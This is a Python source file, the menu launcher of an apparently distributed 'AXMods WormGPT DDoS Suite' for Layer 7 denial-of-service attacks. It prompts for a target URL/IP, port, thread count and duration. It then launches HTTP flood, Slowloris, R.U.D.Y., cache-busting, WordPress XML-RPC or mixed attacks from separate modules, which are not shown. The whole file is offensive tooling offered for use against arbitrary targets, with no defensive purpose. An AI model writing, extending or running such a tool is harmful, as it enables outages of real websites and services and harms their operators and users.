#!/usr/bin/env python3
# AXMods WormGPT DDoS Suite - Layer 7 Ultimate Arsenal
# MAIN INTERFACE

import os, sys, time, threading
from colorama import Fore, Style, init
import importlib.util

# Import modul dari folder attack_methods
sys.path.append('attack_methods')

# ANSI color codes
class Colors:
    RESET = '\033[0m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Logo
class logo:
    @staticmethod
    def axmods():
        print(f'''{Colors.BRIGHT_RED}
               █████╗ ██╗  ██╗███╗   ███╗ ██████╗ ██████╗ ███████╗
              ██╔══██╗╚██╗██╔╝████╗ ████║██╔═══██╗██╔══██╗██╔════╝
              ███████║ ╚███╔╝ ██╔████╔██║██║   ██║██║  ██║███████╗
              ██╔══██║ ██╔██╗ ██║╚██╔╝██║██║   ██║██║  ██║╚════██║
              ██║  ██║██╔╝ ██╗██║ ╚═╝ ██║╚██████╔╝██████╔╝███████║
              ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝{Colors.RESET}''')

    @staticmethod
    def banner():
        print(f'                          {Colors.BRIGHT_WHITE}{Colors.BOLD}⚡ L7 DDoS SUITE{Colors.RESET}{Colors.BRIGHT_RED} | {Colors.GREEN}v3.0{Colors.RESET}\n                          {Colors.BRIGHT_WHITE}{Colors.BOLD}By AXMods{Colors.RESET}{Colors.RED} | {Colors.BRIGHT_WHITE}t.me/axmods{Colors.RESET}\n')

# Loading animation
def loading_animation(text="Loading", duration=2):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    while time.time() < end_time:
        for frame in frames:
            sys.stdout.write(f"\r{Colors.BRIGHT_RED}{frame} {Colors.BRIGHT_WHITE}{text}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
    print("\r" + " " * 60 + "\r")

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Get attack parameters
def get_attack_params():
    clear_screen()
    logo.axmods()
    logo.banner()
    print(f"{Colors.BRIGHT_WHITE}{'─' * 60}")
    
    target = input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}Target URL/IP: {Colors.RESET}").strip()
    if not target:
        print(f"{Colors.BRIGHT_RED}[!] Target required!{Colors.RESET}")
        return None
    
    params = {
        'target': target,
        'port': int(input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}Port (80): {Colors.RESET}") or "80"),
        'threads': int(input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}Threads (500): {Colors.RESET}") or "500"),
        'duration': int(input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}Duration seconds (60): {Colors.RESET}") or "60"),
        'use_https': input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}HTTPS? (y/N): {Colors.RESET}").lower() == 'y'
    }
    
    return params

# Main menu
def main_menu():
    clear_screen()
    logo.axmods()
    logo.banner()
    print(f"{Colors.BRIGHT_WHITE}{'─' * 60}")
    print(f" {Colors.BRIGHT_WHITE}{Colors.BOLD}⚡ L7 Attack Methods{Colors.RESET}\n")
    
    methods = [
        ("HTTP GET/POST Flood", "http_flood"),
        ("SLOWLORIS", "slowloris"),
        ("R.U.D.Y. (Slow POST)", "rudy"),
        ("Cache Busting", "cache_buster"),
        ("WordPress XML-RPC", "wordpress_xmlrpc"),
        ("Mixed Bomb (All Methods)", "mixed_bomb"),
        ("Custom Payload", "custom_payload")
    ]
    
    for i, (name, module) in enumerate(methods, 1):
        print(f"{Colors.BRIGHT_RED}[{i}] {Colors.BRIGHT_WHITE}{name}")
    
    print(f"{Colors.BRIGHT_RED}[0] {Colors.BRIGHT_WHITE}Exit")
    print(f"{Colors.BRIGHT_WHITE}{'─' * 60}")
    
    choice = input(f"{Colors.BRIGHT_RED}⟩ {Colors.BRIGHT_WHITE}Select: {Colors.RESET}").strip()
    
    return choice, methods

# Run attack
def run_attack(method_name, params):
    try:
        module = __import__(f"attack_methods.{method_name}", fromlist=[''])
        attack_class = getattr(module, method_name.title().replace('_', ''))
        
        print(f"\n{Colors.BRIGHT_RED}[+] Starting {method_name} attack...{Colors.RESET}")
        print(f"{Colors.BRIGHT_GREEN}▶ Target: {Colors.BRIGHT_WHITE}{params['target']}")
        print(f"{Colors.BRIGHT_GREEN}▶ Threads: {Colors.BRIGHT_WHITE}{params['threads']}")
        print(f"{Colors.BRIGHT_GREEN}▶ Duration: {Colors.BRIGHT_WHITE}{params['duration']}s")
        print(f"{Colors.BRIGHT_WHITE}{'─' * 60}")
        
        # Start attack in separate thread
        attack = attack_class(**params)
        attack_thread = threading.Thread(target=attack.start)
        attack_thread.daemon = True
        attack_thread.start()
        
        # Countdown
        for i in range(params['duration'], 0, -1):
            sys.stdout.write(f"\r{Colors.BRIGHT_RED}[~] Time remaining: {i}s {'█' * (i//10)}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(1)
        
        print(f"\n{Colors.BRIGHT_RED}[+] Attack completed!{Colors.RESET}")
        time.sleep(2)
        
    except Exception as e:
        print(f"{Colors.BRIGHT_RED}[!] Error: {str(e)}{Colors.RESET}")
        time.sleep(2)

# Main
if __name__ == "__main__":
    init(autoreset=True)
    
    while True:
        choice, methods = main_menu()
        
        if choice == '0':
            print(f"{Colors.BRIGHT_RED}[+] Exiting...{Colors.RESET}")
            break
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(methods):
                method_name = methods[idx][1]
                params = get_attack_params()
                if params:
                    loading_animation("Initializing Attack")
                    run_attack(method_name, params)
            else:
                print(f"{Colors.BRIGHT_RED}[!] Invalid option{Colors.RESET}")
                time.sleep(1)
        except ValueError:
            print(f"{Colors.BRIGHT_RED}[!] Invalid input{Colors.RESET}")
            time.sleep(1)
